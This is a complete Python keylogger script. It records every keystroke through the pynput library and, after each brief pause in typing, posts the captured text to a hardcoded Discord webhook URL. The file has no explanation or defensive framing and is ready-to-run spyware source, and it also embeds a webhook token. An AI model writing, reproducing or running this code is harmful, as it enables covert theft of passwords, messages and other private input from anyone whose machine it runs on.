from pynput.keyboard import Listener, Key
import requests
import threading
import time

WEBHOOK_URL = 'https://discord.com/api/webhooks/1232345214388273153/vXrXVj3waCeAEG3eqJn9gtMkgoVifzOk9oGjo7AuuBwHfFFwtvRJUa061qJ5Qu9N1FXq'

buffer = ""
last_key_time = time.time()
lock = threading.Lock()

def send_to_discord(message):
    if message:
        data = {'content': message}
        requests.post(WEBHOOK_URL, json=data)

def handle_buffer():
    global buffer
    while True:
        with lock:
            if time.time() - last_key_time > 0.5:
                if buffer:
                    send_to_discord(buffer)
                    buffer = ""
        time.sleep(0.1)

def on_press(key):
    global buffer, last_key_time
    try:
        with lock:
            if key == Key.space or key == Key.enter:
                buffer += ' ' if key == Key.space else '\n'
                last_key_time = time.time()
            elif key == Key.backspace:
                buffer = buffer[:-1]
                last_key_time = time.time()
            else:
                buffer += key.char
                last_key_time = time.time()
    except AttributeError:
        pass

threading.Thread(target=handle_buffer, daemon=True).start()

with Listener(on_press=on_press) as listener:
    listener.join()
